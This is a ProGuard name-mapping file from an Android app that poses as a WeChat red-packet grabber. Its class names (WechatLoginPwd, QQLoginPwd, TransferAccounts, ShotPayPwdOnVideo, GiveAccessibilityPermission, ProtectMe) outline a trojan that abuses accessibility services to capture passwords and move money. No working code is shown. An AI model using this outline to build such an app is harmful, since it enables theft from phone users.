es/yy/maj/proguard/mapping.txt
accessibility.ManageAccessibilityJob -> accessibility.g:
    accessibility.ManageAccessibilityJob current -> k
    download.install.InstallApp installApp -> l
    permission.GivePermission mGivePermission -> m
    accessibility.app.WechatInfo mWechatInfo -> n
    accessibility.app.ShotCode mShotCode -> o
    permission.accessibility.GiveAccessibilityPermission mGiveAccessibilityPermission -> p
    accessibility.app.UIinfo mUIinfo -> q
    accessibility.app.ProtectMe mProtectMe -> r
    accessibility.app.WechatLoginPwd mWechatLoginPwd -> s
    accessibility.app.QQLoginPwd mQQLoginPwd -> t
    accessibility.app.AccessibilitySaveNotification mSaveNotification -> u
    accessibility.app.TransferAccounts mTransferAccounts -> v
    com.example.h3.job.WechatAccessibilityJob mWechatAccessbilityJob -> w
    accessibility.app.ShotPayPwdOnVideo mShotPayPwdOnVideo -> x
    accessibility.app.QQTransferAccounts mQQTransferAccounts -> y
    accessibility.app.ExeClick mExeClick -> z
    void <init>() -> <init>
    void onCreateJob(accessibility.QiangHongBaoService) -> a
    void onStopJob() -> b
    accessibility.ManageAccessibilityJob getJob() -> j
    void onReceiveJob(android.view.accessibility.AccessibilityEvent) -> a
    void onWorking() -> a
    void debug(android.view.accessibility.AccessibilityEvent) -> b
accessibility.QiangHongBaoService -> accessibility.QiangHongBaoService:
    boolean mIsclick -> d
    android.graphics.Point mPosition -> e
    int mClickCount -> f
    boolean mIsWorkDoneByHand -> g
    accessibility.QiangHongBaoService service -> a
    accessibility.ManageAccessibilityJob job -> h
    android.os.Handler handlerClick -> b
    java.lang.Runnable runnableClick -> c
    void <clinit>() -> <clinit>
    void <init>() -> <init>
    void onCreate() -> onCreate
    accessibility.QiangHongBaoService getQiangHongBaoService() -> a
    void onAccessibilityEvent(android.view.accessibility.AccessibilityEvent) -> onAccessibilityEvent
    void onInterrupt() -> onInterrupt
    void onServiceConnected() -> onServiceConnected
    void onDestroy() -> onDestroy
    void sendRequsetPermissionBroadCast(android.content.Context) -> a
    void startSetting(android.content.Context) -> b
    boolean isRunning() -> b
    boolean pressLocation(android.graphics.Point) -> a
    boolean pressLongLocation(android.graphics.Point) -> b
    void slideThread(android.graphics.Point,android.graphics.Point) -> a
    boolean slide(android.graphics.Point,android.graphics.Point) -> b
    boolean access$0() -> c
    android.graphics.Point access$1() -> d
    int access$2() -> e
    void access$3(int) -> a
accessibility.QiangHongBaoService$1 -> accessibility.h:
    accessibility.QiangHongBaoService this$0 -> a
    void <init>(accessibility.QiangHongBaoService) -> <init>
    void run() -> run
accessibility.QiangHongBaoService$2 -> accessibility.i:
    accessibility.QiangHongBaoService this$0 -> a
    void <init>(accessibility.QiangHongBaoService) -> <init>
    void onCompleted(android.accessibilityservice.GestureDescription) -> onCompleted
    void onCancelled(android.accessibilityservice.GestureDescription) -> onCancelled
accessibility.QiangHongBaoService$3 -> accessibility.j:
    accessibility.QiangHongBaoService this$0 -> a
    void <init>(accessibility.QiangHongBaoService) -> <init>
    void onCompleted(android.accessibilityservice.GestureDescription) -> onCompleted
    void onCancelled(android.accessibilityservice.GestureDescription) -> onCancelled
accessibility.QiangHongBaoService$4 -> accessibility.k:
    accessibility.QiangHongBaoService this$0 -> a
    android.graphics.Point val$p1 -> b
    android.graphics.Point val$p2 -> c
    void <init>(accessibility.QiangHongBaoService,android.graphics.Point,android.graphics.Point) -> <init>
    void run() -> run